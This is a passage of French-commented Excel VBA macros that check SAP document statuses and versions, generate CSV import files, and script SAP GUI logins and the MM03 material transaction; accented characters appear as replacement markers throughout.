                        ' La FID existe d|fffd|ja : on r|fffd|cupere sa version
                        .Cells(iRow, I_INDICESAP) = sIndiceSAP
                        ' on recherche son statut
                        Set oGetDetail = oBapiCtrl.Add("BAPI_DOCUMENT_GETDETAIL2")
                        oGetDetail.exports("DOCUMENTNUMBER") = sNom
                        oGetDetail.exports("DOCUMENTTYPE") = sType
                        oGetDetail.exports("DOCUMENTPART") = "000"
                        oGetDetail.exports("DOCUMENTVERSION") = sIndiceSAP
                        oGetDetail.exports("GETDOCFILES") = "X"
                        oGetDetail.exports("GETOBJECTLINKS") = vbNullString
                        oGetDetail.exports("GETCOMPONENTS") = vbNullString
                        oGetDetail.exports("GETSTATUSLOG") = vbNullString
                        oGetDetail.exports("GETLONGTEXTS") = vbNullString
                        oGetDetail.exports("GETACTIVEFILES") = vbNullString
                        oGetDetail.exports("GETDOCDESCRIPTIONS") = vbNullString
                        oGetDetail.exports("GETCLASSIFICATION") = vbNullString
                        oGetDetail.exports("GETSTRUCTURE") = vbNullString
                        oGetDetail.exports("GETWHEREUSED") = vbNullString
                        
                        If oGetDetail.Call = True Then
                            Set oDOCUMENTDATA = oGetDetail.imports("DOCUMENTDATA")
                            Set oDOCUMENTFILES = oGetDetail.Tables("DOCUMENTFILES")
                            sStatusSAP = oDOCUMENTDATA.Value("STATUSINTERN")
                            .Cells(iRow, I_STATUTSAP) = sStatusSAP
                            iNbDocu = oDOCUMENTFILES.RowCount
                            .Cells(iRow, I_NBFICHIERS) = iNbDocu
                        End If
                        
                        If sPlanRef <> vbNullString Then
                                bUneErreur = True
                                .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                .Cells(iRow, I_MESSAGE) = "Le document existe d|fffd|j|fffd| dans SAP : le plan de r|fffd|f|fffd|rence ne doit pas |fffd|tre renseign|fffd| dans ce cas."
                        Else
                            If VBA.UCase(Left(sType, 1)) = "R" Then
                                'on est dans le cas d'une FID R
                                'on ne fait rien !
                                bUneErreur = True
                                .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                .Cells(iRow, I_MESSAGE) = "Le document de type r|fffd|pertoire existe d|fffd|j|fffd| dans SAP : aucune modification ne sera appliqu|fffd|e."
                            ElseIf sStatusSAP = "RF" Then
                                bUneErreur = True
                                .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                .Cells(iRow, I_MESSAGE) = "La FID est au statut RF dans SAP : pas de modifications."
                            ElseIf sIndice < sIndiceSAP Then
                                bUneErreur = True
                                .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                .Cells(iRow, I_MESSAGE) = "L'indice demand|fffd| est inf|fffd|rieur |fffd| l'indice existant : pas de modifications."
                            ElseIf sStatusSAP = "MF" Then
                                If sIndice > sIndiceSAP Then
                                    If sStatusSAP = "RF" Then
                                        bUneErreur = True
                                        .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                        .Cells(iRow, I_MESSAGE) = "Le document est au statut 'RF' dans SAP|fffd|: on ne peut pas cr|fffd|er de nouvelle version !"
                                    Else
                                        .Cells(iRow, I_TYPEMESSAGE) = "info"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 4
                                        .Cells(iRow, I_MESSAGE) = "Indice sup|fffd|rieur et status 'MF' dans SAP : cr|fffd|ation d'une nouvelle version au statut VA."
                                        If bExport Then
                                            AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, CREATION_FID, "VA", sPlanRef, sFIDR, sObservations
                                            AjouterLigneOrig iLigneORIG, sType, sNom, sIndice, CHARGER_ORI, "ZGD", vbNullString, iRow, vbNullString, vbNullString
                                            AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                                        End If
                                    End If
                                Else 'indices identiques
                                    .Cells(iRow, I_TYPEMESSAGE) = "alerte"
                                    .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 6
                                    .Cells(iRow, I_MESSAGE) = "Les indices sont identiques et statut 'MF' dans SAP : pas de nouvelle version cr|fffd||fffd|e, les nouveaux fichiers sont ignor|fffd|s et la version existante repasse au statut VA."
                                    If bExport Then
                                        AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, MODIF_FID, "VA", sPlanRef, sFIDR, sObservations
                                        AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                                    End If
                                End If
                            Else    'statut <> MF
                                If sStatusSAP = "RF" Then
                                    .Cells(iRow, I_TYPEMESSAGE) = "alerte"
                                    .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 6
                                    .Cells(iRow, I_MESSAGE) = "Le document est au statut 'RF' dans SAP|fffd|: aucune modification ne sera effectu|fffd|e !"
                                ElseIf sIndiceSAP <> "-" And sIndice = sIndiceSAP Then
                                    .Cells(iRow, I_TYPEMESSAGE) = "alerte"
                                    .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 6
                                    .Cells(iRow, I_MESSAGE) = "L'indice demand|fffd| est le m|fffd|me que celui du document existant et statut <> 'MF' dans SAP : les fichiers ne seront pas import|fffd|s."
                                ElseIf sIndiceSAP = "-" Then
                                    If sIndice <> "-" Then
                                        .Cells(iRow, I_TYPEMESSAGE) = "info"
                                        .Cells(iRow, I_MESSAGE) = "Cr|fffd|ation d'une nouvelle version de la FID au statut VA."
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 4
                                        If bExport Then
                                            'correction bug (la version EC doit passer au statut VA)
                                            If sStatusSAP = "EC" Then
                                                AjouterLigneFid iLigneFID, sType, sNom, sIndiceSAP, sCodeLangue, sLibelle, MODIF_FID, "VA", sPlanRef, sFIDR, sObservations
                                            End If
                                            'fin bug
                                            AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, CREATION_FID, "VA", sPlanRef, sFIDR, sObservations
                                            AjouterLigneOrig iLigneORIG, sType, sNom, sIndice, CHARGER_ORI, "ZGD", vbNullString, iRow, vbNullString, vbNullString
                                            AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                                        End If
                                    ElseIf iNbDocu = 0 Then
                                        .Cells(iRow, I_TYPEMESSAGE) = "info"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 4
                                        .Cells(iRow, I_MESSAGE) = "Indice '-' demand|fffd| et indice '-' dans SAP, pas de fichiers dans SAP : les fichiers seront ajout|fffd|s au document existant, pass|fffd| au statut VA."
                                        If bExport Then
                                            AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, MODIF_FID, "VA", sPlanRef, sFIDR, sObservations
                                            AjouterLigneOrig iLigneORIG, sType, sNom, sIndice, CHARGER_ORI, "ZGD", vbNullString, iRow, vbNullString, vbNullString
                                            AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                                        End If
                                    ElseIf iNbDocu <> 0 And sStatusSAP = "EC" Then
                                        .Cells(iRow, I_TYPEMESSAGE) = "alerte"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 6
                                        .Cells(iRow, I_MESSAGE) = "Indice '-' demand|fffd| et indice '-' dans SAP, fichiers pr|fffd|sents dans SAP : les fichiers seront supprim|fffd|s de la FID existante et remplac|fffd|s par les nouveaux. La FID est pass|fffd|e au statut VA."
                                        If bExport Then
                                            AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, MODIF_FID, "VA", sPlanRef, sFIDR, sObservations
                                            AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                                            'on r|fffd|cup|fffd|re les identifiants des anciens fichiers
                                            For Each row In oDOCUMENTFILES.Rows
                                               AjouterLigneOrig iLigneORIG, sType, sNom, sIndiceSAP, SUPPRIMER_ORI, vbNullString, vbNullString, 0, row.Value("APPLICATION_ID"), row.Value("FILE_ID")
                                            Next
                                            AjouterLigneOrig iLigneORIG, sType, sNom, sIndice, CHARGER_ORI, "ZGD", vbNullString, iRow, vbNullString, vbNullString
                                        End If
                                    ElseIf iNbDocu <> 0 And sStatusSAP = "VA" Then
                                        bUneErreur = True
                                        .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                        .Cells(iRow, I_MESSAGE) = "La FID dans SAP est au statut 'VA' et |fffd| l'indice '-' avec des fichiers : pas de modifications"
                                    Else
                                        bUneErreur = True
                                        .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                       .Cells(iRow, I_MESSAGE) = "Erreur syst|fffd|me : statut SAP inconnu !"
                                    End If
                                Else
                                    If sStatusSAP = "EC" Then
                                        bUneErreur = True
                                        .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                       .Cells(iRow, I_MESSAGE) = "La FID dans SAP est |fffd| l'|fffd|tat 'EC' et |fffd| un indice <> '-' : pas de modifications."
                                    ElseIf sStatusSAP = "VA" Then
                                        .Cells(iRow, I_TYPEMESSAGE) = "info"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 4
                                        .Cells(iRow, I_MESSAGE) = "Cr|fffd|ation d'une nouvelle version au statut VA."
                                        If bExport Then
                                            AjouterLigneFid iLigneFID, sType, sNom, sIndice, sCodeLangue, sLibelle, CREATION_FID, "VA", sPlanRef, sFIDR, sObservations
                                            AjouterLigneOrig iLigneORIG, sType, sNom, sIndice, CHARGER_ORI, "ZGD", vbNullString, iRow, vbNullString, vbNullString
                                            AjouterLigneLiens iLigneLIENS, sType, sNom, sIndice, iRow
                                        End If
                                    Else
                                        bUneErreur = True
                                        .Cells(iRow, I_TYPEMESSAGE) = "erreur"
                                        .Cells(iRow, I_TYPEMESSAGE).Interior.ColorIndex = 3
                                        .Cells(iRow, I_MESSAGE) = "Erreur syst|fffd|me : status SAP inconnu !"
                                    End If
                                End If
                            End If
                        End If 'plan de r|fffd|f|fffd|rence renseign|fffd|
                    End If
                End If
                
            End If 'si pas d'erreur dans les donn|fffd|es
            ' On passe a la ligne suivante
            iRow = iRow + 1
        Wend
        If Not (bExport) Then
            If bUneErreur Then IMG_OK_KO "imgCtrl", False Else IMG_OK_KO "imgCtrl", True
            ' Bouton 2-Contr...
            IMG_OK_KO "imgCtrlGen", False
        Else
            If bUneErreur Then IMG_OK_KO "imgCtrlGen", False Else IMG_OK_KO "imgCtrlGen", True
        End If
        ' Bouton 3-G|fffd|n|fffd|rer...
        IMG_OK_KO "imgGenFic", False
    End With

    oBapiCtrl.Connection.Logoff
    Application.StatusBar = vbNullString
    GererConfiguration True
End Function

Public Sub AjouterLigneFid(ByRef iLigne As Integer, ByVal sType As String, ByVal sNumero As String, ByVal sIndice As String, ByVal sCodeLangue, ByVal sDesc As String, ByVal sCodeOp As String, ByVal sStatus As String, ByVal sPlanRef As String, ByVal sFIDR As String, ByVal sObs As String)
    With Worksheets(shListe_FID)
        .Cells(iLigne + 1, 1) = Str(iLigne)
        .Cells(iLigne + 1, 2) = sType
        .Cells(iLigne + 1, 3) = sNumero
        .Cells(iLigne + 1, 4) = sIndice
        .Cells(iLigne + 1, 5) = sCodeLangue
        .Cells(iLigne + 1, 6) = sDesc
        .Cells(iLigne + 1, 7) = sCodeOp
        .Cells(iLigne + 1, 8) = sStatus
        .Cells(iLigne + 1, 13) = sPlanRef
        .Cells(iLigne + 1, 14) = "X"        'on ne reprend pas les originaux de l'ancienne version
        .Cells(iLigne + 1, 15) = sObs

        If sFIDR <> vbNullString Then .Cells(iLigne + 1, 10) = "R" & VBA.Right(sType, 2): .Cells(iLigne + 1, 11) = sFIDR
    
    End With
    iLigne = iLigne + 1
End Sub

Public Sub AjouterLigneLiens(ByRef iLigne As Integer, ByVal sType As String, ByVal sNumero As String, ByVal sIndice As String, ByVal iLFic As Integer)
    AjouterLignesObjets iLigne, sType, sNumero, sIndice, iLFic, "EQUI", I_EQT
    AjouterLignesObjets iLigne, sType, sNumero, sIndice, iLFic, "IFLOT", I_PT
    AjouterLignesObjets iLigne, sType, sNumero, sIndice, iLFic, "MARA", I_ARTICLE
End Sub

Public Sub AjouterLignesObjets(ByRef iLigne As Integer, ByVal sType As String, ByVal sNumero As String, ByVal sIndice As String, ByVal iLFic As Integer, ByVal sTypeObj As String, iType As Integer)
    
    Dim sListeObjets()
    Dim sListeObj As String
    Dim iNbObj As Integer
    Dim i, iPos, iPos2 As Integer
    
    iNbObj = 0
    If iLFic <> 0 Then
        ReDim sListeObjets(0)
        'recherche des objets
        sListeObj = Worksheets(shListeDeFID).Cells(iLFic, iType)
        If sListeObj = vbNullString Then iNbObj = -1 'cas o|fffd| il n'y a pas d'objets
        
        iPos = VBA.InStr(1, sListeObj, ":")
        If iPos = 0 Then
            sListeObjets(0) = sListeObj
            iNbObj = iNbObj + 1
        Else
            sListeObjets(0) = VBA.Left(sListeObj, iPos - 1)
        End If
        Do Until iPos = 0
            iNbObj = iNbObj + 1
            ReDim Preserve sListeObjets(iNbObj)
            iPos2 = VBA.InStr(iPos + 1, sListeObj, ":")
            If iPos2 = 0 Then sListeObjets(iNbObj) = VBA.Right(sListeObj, VBA.Len(sListeObj) - iPos) Else sListeObjets(iNbObj) = VBA.Mid(sListeObj, iPos + 1, iPos2 - iPos - 1)
            iPos = iPos2
        Loop
    End If
    
    If iNbObj <> -1 Then
        i = 0
        Do Until i = iNbObj
            With Worksheets("liste_liens")
                .Cells(iLigne + 1, 1) = Str(iLigne)
                .Cells(iLigne + 1, 2) = sType
                .Cells(iLigne + 1, 3) = sNumero
                .Cells(iLigne + 1, 4) = sIndice
                .Cells(iLigne + 1, 5) = i + 1
                .Cells(iLigne + 1, 6) = "CREER_LIEN"
                .Cells(iLigne + 1, 7) = sTypeObj
                .Cells(iLigne + 1, 8) = sListeObjets(i)
            End With
            iLigne = iLigne + 1
            i = i + 1
        Loop
    End If
End Sub

Public Sub AjouterLigneOrig(ByRef iLigne As Integer, ByVal sType As String, ByVal sNumero As String, ByVal sIndice As String, ByVal sCodeOp As String, ByVal sAppli As String, ByVal sSupport As String, ByVal iLFic As Integer, ByVal sIDAppliDel As String, ByVal sIDFileDel As String)
    Dim sFichiers() As String
    Dim sListeFic, sChemin As String
    Dim iNbFic As Integer
    Dim i, iPos, iPos2 As Integer
    
    iNbFic = 0
    If iLFic <> 0 Then
        ReDim sFichiers(0)
        'recherche des fichiers
        sListeFic = Worksheets(shListeDeFID).Cells(iLFic, I_FICHIERS)
        If sListeFic = vbNullString Then iNbFic = -1 'cas o|fffd| il n'y a pas d'originaux |fffd| ajouter, ne devrait pas arriver...
        
        iPos = VBA.InStr(1, sListeFic, ":")
        If iPos = 0 Then sFichiers(0) = sListeFic Else sFichiers(0) = VBA.Left(sListeFic, iPos - 1)
        
        Do Until iPos = 0
            iNbFic = iNbFic + 1
            ReDim Preserve sFichiers(iNbFic)
            iPos2 = VBA.InStr(iPos + 1, sListeFic, ":")
            If iPos2 = 0 Then sFichiers(iNbFic) = VBA.Right(sListeFic, VBA.Len(sListeFic) - iPos) Else sFichiers(iNbFic) = VBA.Mid(sListeFic, iPos + 1, iPos2 - iPos - 1)
            iPos = iPos2
        Loop
    End If
    
    If iNbFic <> -1 Then
        i = 0
        Do Until i > iNbFic
            With Worksheets(shListe_Originaux)
                .Cells(iLigne + 1, 1) = Str(iLigne)
                .Cells(iLigne + 1, 2) = sType
                .Cells(iLigne + 1, 3) = sNumero
                .Cells(iLigne + 1, 4) = sIndice
                If iLFic <> 0 Then .Cells(iLigne + 1, 5) = i + 1 Else .Cells(iLigne + 1, 5) = vbNullString
                .Cells(iLigne + 1, 6) = sCodeOp
                .Cells(iLigne + 1, 7) = sAppli
                .Cells(iLigne + 1, 8) = sSupport
                If iLFic <> 0 Then
                    sChemin = Worksheets(shListeDeFID).Cells(iLFic, I_CHEMIN)
                    If VBA.Right(sChemin, 1) <> "\" Then sChemin = sChemin & "\"
                    .Cells(iLigne + 1, 9) = sChemin & sFichiers(i)
                Else
                    .Cells(iLigne + 1, 9) = vbNullString
                End If
                .Cells(iLigne + 1, 10) = "X"
                .Cells(iLigne + 1, 11) = "SIMON_C1"
                .Cells(iLigne + 1, 12) = sIDAppliDel
                .Cells(iLigne + 1, 13) = sIDFileDel
            End With
            iLigne = iLigne + 1
            i = i + 1
        Loop
    End If
    
End Sub

Public Sub cmdGenererFichiers()
    Dim iFile As Integer
    Dim sFichier As String
    Dim i As Integer
    Dim sIpn As String
    
    sIpn = VBA.Trim(InputBox("Renseignez l'ipn." & vbCrLf & "ATTENTION, les fichiers existants seront |fffd|cras|fffd|s !", "SimonGed", GetSetting("SimonGed", "Connexion", "User")))
    If sIpn = vbNullString Then Exit Sub
    
    'fichier fids
    Application.StatusBar = "G|fffd|n|fffd|ration du fichier 'liste_fids.csv en cours..."
    i = 1
    sFichier = APP_REP_PERSO & sIpn & " liste_fids.csv"
    iFile = FreeFile()
    Open sFichier For Output Access Write As #iFile ' open textfile for new input
    With Worksheets(shListe_FID)
        Do Until .Cells(i, 1) = vbNullString
            Print #iFile, .Cells(i, 1) & ";" & .Cells(i, 2) & ";" & .Cells(i, 3) & ";" & .Cells(i, 4) & ";" & .Cells(i, 5) & ";" & .Cells(i, 6) & ";" & .Cells(i, 7) & ";" & .Cells(i, 8) & ";" & .Cells(i, 9) & ";" & .Cells(i, 10) & ";" & .Cells(i, 11) & ";" & .Cells(i, 12) & ";" & .Cells(i, 13) & ";" & .Cells(i, 14) & ";" & .Cells(i, 15) & ";" & .Cells(i, 16) & ";"
            i = i + 1
        Loop
    End With
    Close #iFile

    'fichiers originaux
    Application.StatusBar = "G|fffd|n|fffd|ration du fichier 'liste_originaux.csv en cours..."
    i = 1
    sFichier = APP_REP_PERSO & sIpn & " liste_originaux.csv"
    iFile = FreeFile()
    Open sFichier For Output Access Write As #iFile ' open textfile for new input
    With Worksheets(shListe_Originaux)
        Do Until .Cells(i, 1) = vbNullString
            Print #iFile, .Cells(i, 1) & ";" & .Cells(i, 2) & ";" & .Cells(i, 3) & ";" & .Cells(i, 4) & ";" & .Cells(i, 5) & ";" & .Cells(i, 6) & ";" & .Cells(i, 7) & ";" & .Cells(i, 8) & ";" & .Cells(i, 9) & ";" & .Cells(i, 10) & ";" & .Cells(i, 11) & ";" & .Cells(i, 12) & ";" & .Cells(i, 13) & ";" & .Cells(i, 14)
            i = i + 1
        Loop
    End With
    Close #iFile

    'fichier liens
    Application.StatusBar = "G|fffd|n|fffd|ration du fichier 'liste_liens.csv en cours..."
    i = 1
    sFichier = APP_REP_PERSO & sIpn & " liste_liens.csv"
    iFile = FreeFile()
    Open sFichier For Output Access Write As #iFile ' open textfile for new input
    With Worksheets(shListe_Liens)
        Do Until .Cells(i, 1) = vbNullString
            Print #iFile, .Cells(i, 1) & ";" & .Cells(i, 2) & ";" & .Cells(i, 3) & ";" & .Cells(i, 4) & ";" & .Cells(i, 5) & ";" & .Cells(i, 6) & ";" & .Cells(i, 7) & ";" & .Cells(i, 8) & ";" & .Cells(i, 9)
            i = i + 1
        Loop
    End With
    Close #iFile
    
    Application.StatusBar = vbNullString
    
    IMG_OK_KO "imgGenFic", True
    
    ' On ouvre l'explorateur de fichiers
    Shell "C:\windows\explorer.exe " & APP_REP_PERSO, vbMaximizedFocus
    
    MsgBox "Les fichiers ont |fffd|t|fffd| g|fffd|n|fffd|r|fffd|s dans le r|fffd|pertoire " & APP_REP_PERSO
End Sub

Public Sub Traitement_CB_0()
    Dim sDiv As String, sType As String, sLangue As String
    Dim wS As Worksheet
    Dim lLigneCSV As Long, lLigneFID As Long
    Dim sNom As String, sRef, sNomRef As String
    Dim bRes As Boolean
    
    'On inhibe l'affichage
    Application.ScreenUpdating = False
    Application.StatusBar = vbNullString
    With Worksheets(shListeDeFID)
        Application.StatusBar = "Purge des donn|fffd|es ant|fffd|rieures ..."
        ' On efface les donn|fffd|es pr|fffd|c|fffd|dentes
        .Select
        .Range(C_DEBFID & "5:" & C_FINFID & "65535").Select
        Selection.ClearContents
        Selection.Interior.Pattern = xlNone
        .Range("A5:B65535").Select
        Selection.ClearContents
        .Range(C_DEBSAP & "5:" & C_FINSAP & "65535").Select
        Selection.ClearContents
        .Range("A5:V65535").Select
        Selection.Interior.Pattern = xlNone
        .Range("A1:A1").Select
                
        ' On d|fffd|finit la division
        sDiv = .Cells(2, 3)
        If sDiv = vbNullString Then
            .Cells(2, 3).Select
        Else
            'recherche du type de FID et de la langue
            sLangue = Worksheets(shParam_FID).Cells(Ligne_Division(sDiv), 2)
            sType = Worksheets(shParam_FID).Cells(Ligne_Division(sDiv), 3)
            Set wS = Worksheets(shCSV)
            ' On balaie toutes les lignes de la feuille CSV
            lLigneCSV = 2
            lLigneFID = 5
            While wS.Cells(lLigneCSV, 1) <> vbNullString
                Application.StatusBar = "Traitement de la ligne " & lLigneCSV & " en cours ..."
                sNom = wS.Cells(lLigneCSV, 1)
                sRef = wS.Cells(lLigneCSV, 14)
    
                If wS.Cells(lLigneCSV, 2) <> vbNullString Then sNom = sNom & "_" & wS.Cells(lLigneCSV, 2)
                .Cells(lLigneFID, I_NOM) = sNom
                
                If sRef <> "KO" Then sNomRef = sNom
                
                .Cells(lLigneFID, I_LIBELLE) = wS.Cells(lLigneCSV, 4)
                .Cells(lLigneFID, I_TYPE) = sType
                .Cells(lLigneFID, I_CODELANGUE) = sLangue
                
                If sRef <> "KO" Then
                    .Cells(lLigneFID, I_NEWINDICE) = wS.Cells(lLigneCSV, 12)
                    .Cells(lLigneFID, I_CHEMIN) = wS.Cells(lLigneCSV, 10)
                    .Cells(lLigneFID, I_FICHIERS) = wS.Cells(lLigneCSV, 11)
                Else
                    .Cells(lLigneFID, I_PLANREF) = sNomRef
                End If
                lLigneCSV = lLigneCSV + 1
                lLigneFID = lLigneFID + 1
            Wend
            ' On change d'|fffd|tat les alerteurs
            IMG_OK_KO "imgLecture", True
            ' Bouton 1-Contr...
            IMG_OK_KO "imgCtrl", False
            ' Bouton 2-Contr...
            IMG_OK_KO "imgCtrlGen", False
            ' Bouton 3-G|fffd|n|fffd|rer...
            IMG_OK_KO "imgGenFic", False
        End If
    End With
    Application.StatusBar = vbNullString
End Sub

Private Function Ligne_Division(ByVal Division As String) As Long
    Dim lLigne As Long, lLigneFin As Long
    lLigne = 1
    With Worksheets(shParam_FID)
        lLigneFin = .Cells(65536, 1).End(xlUp).row
        Do Until lLigne > lLigneFin
            If .Cells(lLigne, 1) = Division Then Exit Do
            lLigne = lLigne + 1
        Loop
    End With
    Ligne_Division = lLigne
End Function

Private Sub IMG_OK_KO(ByVal IMG As String, OK As Boolean)
    Dim ImageOK As String, ImageKO As String
    ImageOK = IMG & "OK"
    ImageKO = IMG & "KO"
    With Worksheets(shListeDeFID)
        .Shapes(ImageOK).Visible = OK
        .Shapes(ImageKO).Visible = Not (OK)
    End With
End Sub

Attribute VB_Name = "TDI_LPR"
Global GuiApp As GuiApplication
Global GuiCon As GuiConnection
Global GuiSes As GuiSession



''''''''''''FONCTIONS GENERIQUES PERMETTANT DE LANCER LES OPERATIONS CV0XN''''''''''''''''''''''''''''''''''''''''''''''''

'(1)
Function SAP_CV(ByVal t As String, ByVal Param1 As String, ByVal Param2 As String, ByVal Param3 As String) As Boolean
    'On se connecte
    If Connect_SAP Then
        'La connexion s'est bien d|fffd|roul|fffd| : on lance la transaction
        If Not (SAP_Transaction(t, Param1, Param2, Param3)) Then
            'Erreur lors de l'ex|fffd|cution
            SAP_CV = False
'            MsgBox "Erreur dans le d|fffd|roulement de la transaction SAP n|fffd|" & t
            ThisWorkbook.Sheets(1).Activate
            Cells(1, 1).Select
        Else
            SAP_CV = True
            'Tout s'est bien pass|fffd|
        End If
    Else
        ' Pb dans la connexion
        SAP_CV = False
'        MsgBox "Erreur dans le d|fffd|roulement de la connexion |fffd| SAP"
        ThisWorkbook.Sheets(1).Activate
        Cells(1, 1).Select
    End If
    ' On quitte SAP
    Close_SAP
End Function

'(2)
Function Connect_SAP() As Boolean
    On Error GoTo err_SAP ' La fonction retourne FALSE
    
    Set GuiApp = New GuiApplication
    Set GuiCon = GuiApp.OpenConnection("-04-    PHF-SIMON")
    Set GuiSes = GuiCon.Sessions(0)
    
    If (sUser <> vbNullString) And (sPassword <> vbNullString) Then
        'Login
        GuiSes.ActiveWindow.FindByName("RSYST-MANDT", "GuiTextField").Text = sClient
        GuiSes.ActiveWindow.FindByName("RSYST-BNAME", "GuiTextField").Text = VBA.UCase(sUser)
        GuiSes.ActiveWindow.FindByName("RSYST-BCODE", "GuiPasswordField").Text = sPassword
'        GuiSes.ActiveWindow.FindByName("RSYST-LANGU", "GuiTextField").Text = sLanguage
        GuiSes.FindById("/app/con[0]/ses[0]/wnd[0]/tbar[0]/btn[0]").Press
        If VBA.Left(GuiSes.FindById("wnd[0]").Text, 15) = "SAP Easy Access" Then
            ' Tout est OK
            Connect_SAP = True
            Exit Function
        End If
    End If
err_SAP:
    Connect_SAP = False
End Function

'(3)
Function SAP_Transaction(ByVal Transaction As String, ByVal Param1 As String, ByVal Param2 As String, ByVal Param3 As String) As Boolean
    ' Lance la transaction SAP pass|fffd|e en param|fffd|tre
    
    ' Transaction CS03 : Afficher Nomenclature Article
    If Transaction = "MM03" Then
        If Not (Transaction_SAP_MM03(Transaction, Param1, Param2, Param3)) Then  ' !!
            'Erreur lors de l'ex|fffd|cution de la fonction
            SAP_Transaction = False
        Else
            SAP_Transaction = True
        End If
    End If
End Function

'(4)
Sub Close_SAP()
    On Error Resume Next
    ' Fermeture de la transaction
    GuiSes.EndTransaction
    'Fermeture Session
    GuiCon.CloseSession (GuiSes.ID)
    'Fermeture de la connexion
    GuiCon.CloseConnection
    ' On vide la m|fffd|moire
    Set GuiSes = Nothing
    Set GuiCon = Nothing
    Set GuiApp = Nothing
End Sub

Function GetStatus() As String
    On Error GoTo err
    If GuiSes Is Nothing Then
        GetStatus = "Session non connect|fffd|e"
    Else
        GetStatus = GuiSes.ActiveWindow.FindByName("sbar", "GuiStatusbar").Text
        Exit Function
    End If
err:
    GetStatus = "NOK"
End Function

' Afficher les donn|fffd|es article
Function Transaction_SAP_MM03(ByVal Transaction As String, ByVal Onglet_D|fffd|part As String, ByVal Lign As Long, ByVal Onglet_Arriv|fffd|e As String) As Boolean
    Dim sMessage As String, sScreenName As String
    On Error GoTo err_SAP ' La fonction retourne FALSE
    With Worksheets(Onglet_D|fffd|part)
        ' Transaction MM03
        GuiSes.StartTransaction (Transaction)
        ' Article
        If .Cells(Lign, .Range("PrSacimMabec").Column).Value <> vbNullString Then
            GuiSes.FindById("wnd[0]/usr/ctxtRMMG1-MATNR").Text = .Cells(Lign, .Range("PrSacimMabec").Column).Value
            'On valide : |fffd|cran suivant
            GuiSes.FindById("wnd[0]").SendVKey 0
            sMessage = GetStatus()
            If (sMessage = vbNullString) Or (sMessage = "NOK") Then
                ' Pas d'erreur
                ' On valide la vue Achats
                GuiSes.FindById("wnd[1]/usr/tblSAPLMGMMTC_VIEW").getAbsoluteRow(7).Selected = True
                GuiSes.FindById("wnd[1]/tbar[0]/btn[0]").Press
                'On r|fffd|cup|fffd|re le nom de l'|fffd|cran de d|fffd|part ... |fffd| comparer au nom d'|fffd|cran d'arriv|fffd|e
                sScreenName = GuiSes.FindById("wnd[1]").Text
                If sScreenName = "Nvx organisationnels" Then
                    ' On documente la division
                    GuiSes.FindById("wnd[1]/usr/ctxtRMMG1-WERKS").Text = VBA.Mid(Sheets(ShAffaire).Cells(7, 5).Value, 1, 4)
                    GuiSes.FindById("wnd[1]/tbar[0]/btn[0]").Press
                End If
                'On r|fffd|cup|fffd|re le nom de l'|fffd|cran de d|fffd|part ... |fffd| comparer au nom d'|fffd|cran d'arriv|fffd|e
                sScreenName = GuiSes.FindById("wnd[2]").Text
                If sScreenName = "Erreur" Then
                    ' On valide
                    GuiSes.FindById("wnd[2]/tbar[0]/btn[0]").Press
                    ' On revient au menu principal
                    GuiSes.FindById("wnd[1]/tbar[0]/btn[12]").Press
                    GuiSes.FindById("wnd[0]/tbar[0]/btn[3]").Press
                ElseIf sScreenName = "Avertissement" Then
                    GuiSes.FindById("wnd[2]/tbar[0]/btn[0]").Press
                    ' On r|fffd|cup|fffd|re Unit|fffd| de qt|fffd| base
                    .Cells(Lign, 126).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARA-MEINS").Text
                    ' On r|fffd|cup|fffd|re Groupe d'acheteurs
                    .Cells(Lign, 115).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARC-EKGRP").Text
                    ' On r|fffd|cup|fffd|re Statut art. par div.
                    .Cells(Lign, 124).Value = GuiSes.FindById("wnd[0]/usr/tabsTABSPR1/tabpSP09/ssubTABFRA1:SAPLMGMM:2000/subSUB2:SAPLMGD1:2301/ctxtMARC-MMSTA").Text
                    ' On r|fffd|cup|fffd|re Groupe marchandises
